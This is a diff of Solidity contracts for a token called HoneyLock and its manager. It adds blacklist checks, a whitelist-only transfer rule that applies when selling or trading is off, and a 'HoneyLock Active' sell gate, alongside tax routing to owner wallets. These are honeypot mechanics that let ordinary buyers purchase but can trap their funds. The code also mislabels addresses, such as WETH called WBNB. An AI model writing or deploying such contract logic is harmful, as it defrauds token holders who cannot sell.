@@ -777,9 +777,6 @@ contract HoneyLockManager {
         );
         IERC20(_tokenAddress).approve(address(router), _tokenAmount);
 
-        
-        // console.log("Balance OF Contract", IERC20(_tokenAddress).balanceOf(address(this)));
-
         router.addLiquidityETH{value: msg.value}(
             _tokenAddress,
             _tokenAmount,
@@ -857,12 +854,10 @@ contract HoneyLock is ERC20, Ownable {
         threshold = _threshold;
 
         router = IJoeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
-
         factory = IJoeFactory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
-
         WBNB = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
-
         lpPair = factory.createPair(WBNB, address(this));
+
         swapAndLiquifyEnabled = false;
         _mint(msg.sender, _totalSupply * (10**_decimals));
     }
@@ -871,21 +866,26 @@ contract HoneyLock is ERC20, Ownable {
         address from,
         address to,
         uint256 amount
-    ) internal override virtual { 
+    ) internal override virtual {
+        require(!_isBlacklisted[from], "BLACKLISTED ADDRESS"); 
+        require(!_isBlacklisted[to], "BLACKLISTED ADDRESS"); 
+
         uint256 amountReceived;
+        uint256 taxAmount = takeTaxes(from, to, amount);
+
+        if(!isSelling || !isTrading || taxAmount == 0){
+            require(_isWhitelisted[_msgSender()], "HoneyLock: Transfer Failed");
+        }
 
         if (takeTax){
-            uint256 taxAmount = takeTaxes(from, to, amount);
             amountReceived = amount - taxAmount;
-            uint256 contractBalance = address(this).balance;
-
-            if (swapAndLiquifyEnabled && contractBalance > 1) {
+            if (swapAndLiquifyEnabled) {
                 super._transfer(from, address(this), taxAmount);
                 uint256 contractTokenBalance = balanceOf(address(this));
                 if (contractTokenBalance > threshold) {
                     swapTokensForBNB(taxAmount);
                 }
-            require(distributeTax());
+            distributeTax(from, taxAmount);
             }
         } else {
             amountReceived = amount;
@@ -896,7 +896,6 @@ contract HoneyLock is ERC20, Ownable {
     }
 
     function addLiquidity(uint256 amount) external payable {
-        // console.log("TESTING ADD LIQUIDITY");
         approve(address(this), amount);
         IERC20(address(this)).transferFrom(
             msg.sender,
@@ -904,9 +903,6 @@ contract HoneyLock is ERC20, Ownable {
             amount
         );
         IERC20(address(this)).approve(address(router), amount);
-
-        
-        // console.log("Balance OF Contract", IERC20(_tokenAddress).balanceOf(address(this)));
 
         router.addLiquidityETH{value: msg.value}(
             address(this),
@@ -924,15 +920,11 @@ contract HoneyLock is ERC20, Ownable {
         address to, 
         uint256 amount
     ) internal returns (uint256) {
-        require(!_isBlacklisted[_msgSender()]);
         uint256 currentFee;
         uint256 finalAmount;
 
-        // uint256 transactionThreshold = (totalSupply() / 1000) * maxTransactionAmount;
-        // require(amount < transactionThreshold);
         if (from == lpPair /* address(this)*/) { // buying
-
-            if(!_isWhitelisted[msg.sender]){
+            if(!_isWhitelisted[_msgSender()]){
                 require(isTrading, "Trading Disabled");
                 require(buyCount + 1 <=  maxBuy, "Transfer Failed");
                 if(unlockTime + minBlocks >= block.number) {
@@ -946,9 +938,8 @@ contract HoneyLock is ERC20, Ownable {
             }
             buyCount++;
         } else if (to == lpPair /* address(this)*/) { //selling
-            // console.log("TOTAL SUPPLY", totalSupply());
             uint256 sellAmount = (totalSupply() / sellDecimals) * maxSellAmount;
-            if (!_isWhitelisted[_msgSender()] /*&& !_isGoldenAddress[_msgSender()]*/){
+            if (!_isWhitelisted[_msgSender()]){
                 require(amount < sellAmount);
                 require(isSelling, "HoneyLock Active");
                 require(isTrading, "Trading Disabled");
@@ -973,16 +964,30 @@ contract HoneyLock is ERC20, Ownable {
         return finalAmount;
     }
 
-    function distributeTax() internal returns (bool) {
-        uint256 contractBalance = address(this).balance;
-        uint256 toMarketing = (contractBalance/100)*marketingTax;
-        uint256 toBuyBack = (contractBalance/100)*buyBackTax;
-        uint256 toLp = contractBalance - toMarketing - toBuyBack;
+    function distributeTax(address from, uint256 taxAmount) internal returns (bool) {
 
-        (bool tmpSuccess,) = payable(marketingWallet).call{value: toMarketing}("");
-        (tmpSuccess,) = payable(buybackWallet).call{value: toBuyBack}("");
-        (tmpSuccess,) = payable(lpWallet).call{value: toLp}("");
+        if (swapAndLiquifyEnabled){
+            uint256 contractBalance = address(this).balance;
+            uint256 toMarketing = (contractBalance/100)*marketingTax;
+            uint256 toBuyBack = (contractBalance/100)*buyBackTax;
+            uint256 toLp = contractBalance - toMarketing - toBuyBack;
 
+            (bool tmpSuccess,) = payable(marketingWallet).call{value: toMarketing}("");
+            (tmpSuccess,) = payable(buybackWallet).call{value: toBuyBack}("");
+            (tmpSuccess,) = payable(lpWallet).call{value: toLp}("");
+            
+            super._transfer(from, address(this), taxAmount);
+        } else {
+            uint256 totalTax = taxAmount;
+            uint256 toMarketing = (totalTax/100)*marketingTax;
+            uint256 toBuyBack = (totalTax/100)*buyBackTax;
+            uint256 toLp = totalTax - toMarketing - toBuyBack;
+
+            super._transfer(from, marketingWallet, toMarketing);
+            super._transfer(from, buybackWallet, toBuyBack);
+            super._transfer(from, lpWallet, toLp);
+        }
+        
         return true;
     }
 
